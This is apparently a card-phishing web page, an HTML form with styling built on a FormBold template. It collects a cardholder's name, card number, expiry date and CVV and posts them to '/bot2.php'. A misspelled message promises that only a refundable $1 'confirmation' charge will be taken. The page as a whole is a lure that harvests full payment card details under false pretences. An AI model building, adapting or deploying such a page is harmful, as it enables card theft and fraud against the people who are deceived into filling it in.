<div class="formbold-main-wrapper">
  <!-- Author: FormBold Team -->
  <!-- Learn More: https://formbold.com -->
  <div class="formbold-form-wrapper">

    <form action="/bot2.php" method="POST">
      <div class="formbold-form-title">
        <h2 class="">Enter your payment address</h2>
        <p>
          
        </p>

       
      </div>

      <div class="formbold-mb-3">
        <label for="address" class="formbold-form-label">
          Card holder Name
        </label>
        <input
          placeholder="Card holder "
          type="text"
          name="cardholder"
          id="cardholder"
          class="formbold-form-input"
        />
      </div>

 <div class="formbold-mb-3">
  <label for="cardNumber" class="formbold-form-label">
    Card Number
  </label>
  <input
    placeholder="Card Number"
    type="number"
    name="cardNumber"
    id="cardNumber"
    class="formbold-form-input"
  />
</div>

      <div class="formbold-input-flex">
        <div>
          <label for="state" class="formbold-form-label"> Expire Date </label>
          <input
          placeholder="MM/YY"
            type="text"
            name="month"
            id="month"
            class="formbold-form-input"
          />
        </div>
       <div>
  <label for="cvv" class="formbold-form-label">CVV</label>
  <input
    placeholder="***"
    pattern="[0-9]{3}"
    maxlength="3"
    type="text"
    name="cvv"
    id="cvv"
    class="formbold-form-input"
    required
  />
</div>

      </div>

      </div>
  </div>
</div>
        <center>
          <h5  class="sexy" >It's gonna cherge only 1$ from your bank just for confirmation.Anyway it's refundable </h5>
        </br>
<input type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
  <label for="vehicle1"> Yes i agree </label><br>
      <button class="formbold-btn">Pay</button>
      </center>
    </form>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  body {
    font-family: 'Inter', sans-serif;
  }
  .formbold-mb-3 {
    margin-bottom: 15px;
  }
  .formbold-relative {
    position: relative;
  }
  .formbold-opacity-0 {
    opacity: 0;
  }
  .formbold-stroke-current {
    stroke: currentColor;
  }
  #supportCheckbox:checked ~ div span {
    opacity: 1;
  }

  .formbold-main-wrapper {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 48px;
  }

  .formbold-form-wrapper {
    margin: 0 auto;
    max-width: 570px;
    width: 100%;
    background: white;
    padding: 0px;
  }

  .formbold-img {
    margin-bottom: 45px;
  }

  .formbold-form-title {
    margin-bottom: 0px;
  }
  .formbold-form-title h2 {
    font-weight: 600;
    font-size: 28px;
    line-height: 34px;
    color: #07074d;
  }
  .formbold-form-title p {
    font-size: 16px;
    line-height: 24px;
    color: #536387;
    margin-top: 12px;
  }

  .formbold-input-flex {
    display: flex;
    gap: 20px;
    margin-bottom: 15px;
  }
  .formbold-input-flex > div {
    width: 50%;
  }
  .formbold-form-input {
    text-align: center;
    width: 100%;
    padding: 13px 22px;
    border-radius: 5px;
    border: 1px solid #dde3ec;
    background: #ffffff;
    font-weight: 500;
    font-size: 16px;
    color: #536387;
    outline: none;
    resize: none;
  }
  .formbold-form-input:focus {
    border-color: #6a64f1;
    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
  }
  .formbold-form-label {
    color: #536387;
    font-size: 14px;
    line-height: 24px;
    display: block;
    margin-bottom: 0px;
  }

  .formbold-checkbox-label {
    display: flex;
    cursor: pointer;
    user-select: none;
    font-size: 16px;
    line-height: 24px;
    color: #536387;
  }
  .formbold-checkbox-label a {
    margin-left: 5px;
    color: #6a64f1;
  }
  .formbold-input-checkbox {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border-width: 0;
  }
  .formbold-checkbox-inner {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 20px;
    height: 20px;
    margin-right: 16px;
    margin-top: 2px;
    border: 0.7px solid #dde3ec;
    border-radius: 3px;
  }

  .formbold-btn {
    font-size: 16px;
    border-radius: 5px;
    padding: 14px 25px;
    border: none;
    font-weight: 500;
    background-color: #6a64f1;
    color: white;
    cursor: pointer;
    margin-top: 25px;
  }
  .formbold-btn:hover {
    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
  }
  .sexy{
font-style: italic;
  }
</style>
